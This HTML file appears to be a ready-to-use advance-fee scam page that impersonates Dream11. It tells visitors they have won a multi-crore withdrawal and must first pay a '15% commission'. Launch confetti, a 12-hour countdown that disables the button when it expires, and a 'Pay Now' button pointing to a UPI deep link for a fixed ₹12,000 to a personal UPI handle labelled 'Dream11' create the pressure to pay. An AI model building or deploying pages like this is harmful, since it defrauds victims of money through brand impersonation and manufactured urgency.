<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Dream 11 Withdrawal</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background-color: #f0f0f0;
      text-align: center;
    }
    .container {
      padding: 20px;
      max-width: 500px;
      margin: auto;
      background-color: #fff;
      border-radius: 10px;
      margin-top: 40px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: green;
      font-size: 30px;
      margin-bottom: 10px;
    }
    .amount {
      font-size: 26px;
      font-weight: bold;
      margin: 15px 0;
    }
    .note {
      font-size: 18px;
      color: #b33;
      margin-bottom: 30px;
    }
    button {
      background-color: #28a745;
      color: white;
      padding: 15px 30px;
      border: none;
      border-radius: 5px;
      font-size: 20px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #218838;
    }
    #timer {
      font-size: 18px;
      color: #333;
      margin-top: 10px;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 1000;
    }
  </style>
</head>
<body>

  <canvas id="confetti-canvas"></canvas>

  <div class="container">
    <h1>Congratulations user</h1>
    <div class="amount">Your withdrawal amount: ₹5,00,00,00,000</div>
    <div class="note">You need to pay a <strong>15% commission</strong> to withdraw the amount.</div>
    <div id="timer">Time Remaining: Loading...</div>
    <button id="payNowBtn" onclick="redirectToUPIPayment()">Pay Now</button>
  </div>

  <!-- Confetti Library -->
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

  <script>
    // Confetti on page load for 2 seconds
    window.onload = function() {
      const duration = 2000;
      const end = Date.now() + duration;
      (function frame() {
        confetti({
          particleCount: 5,
          angle: 60,
          spread: 55,
          origin: { x: 0 }
        });
        confetti({
          particleCount: 5,
          angle: 120,
          spread: 55,
          origin: { x: 1 }
        });
        if (Date.now() < end) {
          requestAnimationFrame(frame);
        }
      })();
    };

    // Countdown Timer Logic
    const timerElement = document.getElementById('timer');
    const payNowBtn = document.getElementById('payNowBtn');

    if (!localStorage.getItem('startTime')) {
      localStorage.setItem('startTime', Date.now());
    }

    const startTime = parseInt(localStorage.getItem('startTime'));
    const expiryTime = startTime + (12 * 60 * 60 * 1000); // 12 hours

    function updateTimer() {
      const now = Date.now();
      const timeLeft = expiryTime - now;

      if (timeLeft <= 0) {
        timerElement.textContent = "Time Remaining: 00:00:00";
        payNowBtn.style.display = 'none';
      } else {
        const hours = Math.floor(timeLeft / (1000 * 60 * 60));
        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
        timerElement.textContent = `Time Remaining: ${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
      }
    }

    setInterval(updateTimer, 1000);
    updateTimer();

    // UPI payment redirect
    function redirectToUPIPayment() {
      const upiID = "paymentmanager8256@okicici";
      const payeeName = "Dream11";
      const amount = "12000.00"; // ₹12,000 fixed amount
      const upiLink = `upi://pay?pa=${upiID}&pn=${encodeURIComponent(payeeName)}&am=${amount}&cu=INR`;

      window.location.href = upiLink;
    }
  </script>
</body>
</html>
